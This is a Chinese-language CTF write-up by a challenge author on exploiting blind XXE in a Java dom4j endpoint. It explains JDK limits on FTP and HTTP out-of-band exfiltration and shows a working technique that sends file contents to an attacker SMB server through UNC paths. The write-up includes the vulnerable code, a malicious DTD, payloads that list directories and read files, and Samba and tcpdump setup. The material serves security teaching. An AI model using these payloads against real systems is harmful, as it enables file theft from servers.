# 前言
上个星期出了一个XXE漏洞的小挑战，总计有四个师傅做出来
M00nBack、小可爱、do9gy、珂字辈、Y4tacker其中M00nBack师傅拿到一血。都是预期解下面我公布一下这个题的解法。

# 理解题目获取考点
题目代码如下
```
package com.example.xxe.controller;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.HttpServletRequest;
import java.io.StringReader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;


@RestController
@RequestMapping("/api/system")
public class BlindXxeController {

    @PostMapping("/update-config")
    public ResponseEntity<Map<String, Object>> updateSystemConfig(
            @RequestParam("configXml") String configXml,
            HttpServletRequest request) {
        
        Map<String, Object> response = new HashMap<>();
        
        try {
            CompletableFuture.runAsync(() -> {
                try {
                    SAXReader reader = new SAXReader();
                    Document document = reader.read(new StringReader(configXml));
                    processConfigDocument(document);
                    
                } catch (DocumentException e) {
                    System.err.println("配置处理错误: " + e.getMessage());
                }
            });
            response.put("status", "success");
            response.put("message", "配置更新请求已提交，正在后台处理");
            
            return ResponseEntity.ok(response);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", "配置更新请求失败");
            response.put("error", "系统内部错误"); 
            
            return ResponseEntity.internalServerError().body(response);
        }
    }
    

    private void processConfigDocument(Document document) {
        try {
            Element root = document.getRootElement();
            List<Element> settings = root.elements("setting");
            for (Element setting : settings) {
                String name = setting.attributeValue("name");
                String value = setting.getTextTrim();
                System.out.println("更新配置: " + name + " = " + value);
            }
            
            System.out.println("配置处理完成，共处理 " + settings.size() + " 个配置项");
            
        } catch (Exception e) {
            System.err.println("配置处理异常: " + e.getMessage());
        }
    }
}
```
一个标准的XXE漏洞写法，所有错误都被捕获所以首先排除报错XXE。那么只剩下通过外带获取flag的方法，而在JAVA里XXE外带获取文件内容一般使用ftp协议网上有现成的项目。

*https://github.com/LandGrey/xxe-ftp-server*

我们尝试使用这个项目进行测试

![](https://files.mdnice.com/user/114427/47c86840-cf31-4e77-824d-d41db24aeb8b.png)

![](https://files.mdnice.com/user/114427/b13e1789-52ba-4760-9536-78cbd8a62288.png)

我在后台日志中看到很多人一直在测试linux相关路径，实际上windows和linux是很容易判断的如果你输入一个linux路径然后xxe-ftp-server没有收到ftp请求就说明你请求的那个文件不存在。所以当你请求/etc/passwd收不到请求时你就需要立马反应过来后端服务器可能是windows。

从fake server可以获取到JDK版本为Java1.8.0_202 且目标操作系统为windows。我给的信息里flag位于根目录所以我们继续请求c:/flag、c:/flag.txt进行测试发现也接收不到任何请求。说明flag文件名也是考点需要我们自行获取，XXE是可以列目录的但是我们此处的JDK版本为Java1.8.0_202太高，根据xxe-ftp-server的项目说明是无法获取多行内容的。

至此我们题目转变为windows环境下JDK>=8u162如何通过OOB获取多行内容。

# 思考🤔
因为这个题目是我在研究某个产品XXE漏洞衍生出来的结果，所以此处把我当时的思考过程全部写出来。
## 高版本JDK为何无法外带多行内容
通过查看JDK代码发现关键位置`sun.net.ftp.impl.FtpClient#issueCommand`

当JDK8u121时代码为

![](https://files.mdnice.com/user/114427/8603ef4d-df3d-4d86-a83f-1c989c09f3ff.png)

当JDK8u131时代码为

![](https://files.mdnice.com/user/114427/aabf60ea-0633-4339-8e01-b497b7939377.png)

注意到多了一个判断`var1.indexOf(10)!=1`这里判断我们FTP命令里如果存在`\n`则直接抛出异常，所以当JDK>=8u131时通过FTP协议无法外带多行内容。

这里和网上说的jdk<8u162似乎不同，我下载了多个版本的JDK代码得到的判断应该是`JDK>=8u131`时通过FTP协议无法外带多行内容。

FTP协议这里我还尝试从user、pass里外带内容，但是最后也会经过`issueCommand`的判断。

![](https://files.mdnice.com/user/114427/c95ce22f-5a5d-45f5-94f7-8d430769f083.png)


![](https://files.mdnice.com/user/114427/a3f217d2-71d7-4a83-a3a7-958c98578bdf.png)

## http协议外带分析
既然FTP不行自然想到通过http外带，我们先看一个URI的构成部分。

![](https://files.mdnice.com/user/114427/f79f001c-6ca6-4e01-b344-63e04c0648be.png)

可以外带的部分如下
-  userinfo
-  hostname
-  path
-  query
-  fragment

`userinfo`处似乎最有希望，因为安装传统思维此处的`user:pass`会被`base64`编码正好可以将换行等特殊字符编码。但是实际上`java.net.URL`虽然允许`http://user:pass@example.com`格式的`URL`传入但是发送请求是不会自动处理然后携带`Authorization`头。

JDK8u65测试

userinfo处可以加入`\n`但是不会外带信息出来。

![](https://files.mdnice.com/user/114427/68d3cd00-c8ee-48b3-8ae8-5c0dbc4e3db8.png)


JDK8u202测试

直接不会发送http请求，因为在发送请求前会先经过`sun.net.www.protocol.http.HttpURLConnection#checkURL`检测了整个URI里是否含有`\n`

![](https://files.mdnice.com/user/114427/fa87db7e-5cce-4997-9eaa-8b3a47b4d2e6.png)

所以根据上面的分析http协议没有任何可能外带多行数据，除非有某种特殊的编码方式在进入checkURL之前对多行内容进行编码。但是经过研究并没有发现这种方法。

## 其他可对外请求协议分析
分析JDK代码`java.net.URL#getURLStreamHandler`

![](https://files.mdnice.com/user/114427/21004cc3-166f-4682-8dab-c6f115846c80.png)

此处从`sun.net.www.protocol.xxx.Handler`寻找支持的协议xxx为协议名，所以一共支持下面几张协议

![](https://files.mdnice.com/user/114427/d5a80f1b-d2a8-4fb2-9743-74dd9325f41a.png)

`jar`协议最后也是调用`http`协议所以跳过分析，查看`mailto`协议实现

![](https://files.mdnice.com/user/114427/6f6b239b-d564-4848-b087-d741f17d0a90.png)

此处对外发送数据

![](https://files.mdnice.com/user/114427/d702862e-4e2d-40ee-a830-83e222267b1f.png)

也对`\n`进行了判断，而且`mailto`协议没有实现`getInputStream`方法会直接报错`protocol doesn't support input`

至此我们已经分析完除file、netdoc协议外的其他协议，那么file、netdoc协议可以外带数据吗？

很容易想到使用UNC路径进行smb协议外带，而题目这里使用的windows正好符合条件。
实际上在bh-eu-13上有人就讲过使用smb外带数据

*https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf*

![](https://files.mdnice.com/user/114427/00af4b79-267c-4eb3-893a-96db824498fc.png)

但是不知道为何他说不能外带多行数据

![](https://files.mdnice.com/user/114427/cf9109b7-fae7-4b54-891a-ecc4702a8123.png)

通过测试smb实际上是可以外带多行数据

# 题解
通过上面的分析我们选用file或netdoc协议unc路径进行外带。

四位解题者都是通过搭建一个匿名smb服务，然后使用tcpdump抓包使用Wireshark解析流量获取flag。先给出一血`M00nBack`师傅的解。

搭建smb 匿名server，并开启一个http服务放置恶意dtd
```
安装samba
apt install samba
修改配置文件
/etc/samba/smb.conf

[global]
guest account = nobody
map to guest = Bad User
server role = standalone server
[tmp]
path = /tmp
guest ok = yes
browseable = yes
public = yes

重启
service smbd restart

data.dtd内容如下
<!ENTITY % all "<!ENTITY send SYSTEM 'file://\\\\ip/?x=%f;'>"> %all;
启动web
python3 -m http.server 9991
tcpdump抓包445端⼝的流量
tcpdump -i eth0 port 445 -w smb_445.pcap
```
发送payload列目录
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % f SYSTEM "netdoc://C:/">
<!ENTITY % dtd SYSTEM "http://ip:9991/data.dtd"> %dtd;
]>
<data>&send;</data>
```

![](https://files.mdnice.com/user/114427/eec535c5-ba11-49c1-9938-9bc96a36b929.png)

获取到flag文件路径为`C:/flagxdzqs.txt`继续发送payload获取文件内容
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % f SYSTEM "file:///C:/flagxdzqs.txt">
<!ENTITY % dtd SYSTEM "http://ip:9991/data.dtd"> %dtd;
]>
<data>&send;</data>
```

![](https://files.mdnice.com/user/114427/972d1f21-c9fd-48ea-a4ba-e24d700eb393.png)

成功获取到`flag{Make XXE Attacks Brilliant Again}`

解题看似很简单其实这里有三个坑点。

坑点一：如果你在自己本地测试的话`win11`因为安全策略的原因是不能访问匿名的smb服务的，只会发送最开始的认证请求不会发送`Tree Connect Request`。

![](https://files.mdnice.com/user/114427/42b4ea61-a6b2-4878-91c7-220ee71ab3e5.png)

坑点二：通过家宽往云服务器445端口发送请求是发不出去的。

![](https://files.mdnice.com/user/114427/4e3db7da-bac4-4aba-9695-f707bd04f6bc.png)

有一个解题者就是因为这个原因导致一直以为是云服务器不能开出445端口，换了几个云服务商都不行。后面经过我的提醒才意识到是家宽往外面445发不出请求的原因，不是云服务开不出445.

坑点三:`Tree Connect Request`的第一个字符不能为;分号。这是我在读取win.ini时发现的如果测试者直接使用`file:////ip/%file;`读取flag会发现不会发送smb请求。因为flag第一个字符即为;分号，这里我们只需要使用`file:////ip/a%file;`让第一个字符为其他的即可。


我这里给出一个简单`fake server`脚本，直接使用`impacket`库开一个匿名`smb`服务，然后打开日志即可通过日志查看外带的多行内容。

运行脚本

``````
python3 xxe-smb-server.py public-ip-address web-port
``````

![](https://files.mdnice.com/user/114427/7163a356-5aac-4f74-9583-39fc530792fa.png)

复制输出的payload发送给服务器

![](https://files.mdnice.com/user/114427/7163a356-5aac-4f74-9583-39fc530792fa.png)

fake server收到请求

![](https://files.mdnice.com/user/114427/cbfe8833-e726-4339-9075-7d0ca2cbe965.png)


payload

``````
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///">
  <!ENTITY % dtd SYSTEM "http://ip:port/data.dtd"> %dtd;
  ]>
  <data>&send;</data>
``````

file:///可改为其他路径测试

![](https://files.mdnice.com/user/114427/10a96ab4-f74f-4526-9cbd-42db29d86b0e.png)

获取flag文件路径为`C:/flagxdzqs.txt`

![](https://files.mdnice.com/user/114427/01b3ef9b-525c-43fd-84d0-67f51a9f03aa.png)

获取到`C:/flagxdzqs.txt`文件内容`flag{Make XXE Attacks Brilliant Again}`

最后给出xxe-smb-server项目地址

*https://github.com/cwkiller/xxe-smb-server*
